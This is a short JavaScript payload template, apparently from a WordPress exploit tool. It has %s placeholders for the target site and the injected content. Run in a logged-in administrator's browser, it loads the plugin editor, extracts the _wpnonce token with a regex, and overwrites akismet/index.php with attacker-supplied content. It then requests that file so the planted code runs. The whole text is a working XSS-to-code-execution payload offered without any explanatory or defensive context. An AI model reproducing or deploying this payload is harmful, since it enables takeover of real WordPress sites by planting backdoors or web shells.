function GET(target)
{
    var xml = null;

    xml = new XMLHttpRequest();
    xml.open( "GET", target, false );
    xml.send( null );
    return xml.responseText;
}

var url = GET("%s/wp-admin/plugin-editor.php?file=akismet/index.php&plugin=akismet/akismet.php")

function POST(target, token)
{
    var xml = null;

    xml = new XMLHttpRequest();
    xml.open( "POST", target, false );
    xml.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xml.send("_wpnonce=" + token + "&_wp_http_referer=%s/wp-admin/plugin-editor.php?file=akismet/index.php&plugin=akismet/akismet.php&newcontent=%s&action=update&file=akismet/index.php&plugin=akismet/index.php&scrollto=0&submit=Update+File")
    return xml.responseText;

}

var reg = /name=\"_wpnonce\"\svalue=\"([^)]+)\"/;
var match = reg.exec(url);
var token = match[1].slice(0, 10);

POST("%s/wp-admin/plugin-editor.php", token);
GET("%s/wp-content/plugins/akismet/index.php");
